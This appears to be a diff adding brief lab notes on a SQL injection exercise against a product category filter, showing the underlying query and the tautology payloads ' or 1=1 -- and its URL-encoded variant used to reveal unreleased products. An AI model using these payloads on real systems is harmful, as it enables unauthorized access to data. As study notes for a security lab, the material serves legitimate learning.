@@ -1,0 +1,16 @@
+SQL Injectiopn - product category filter
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+End goal: display all the products both released and unreleased
+
+Analysis:
+SELECT * FROM products WHERE category = 'Pets' AND released = 1
+
+category=' or 1=1 --
+category='+OR+1=1--
+
+SQLi Payloads:
+' or 1=1 --
+'+OR+1=1--
+
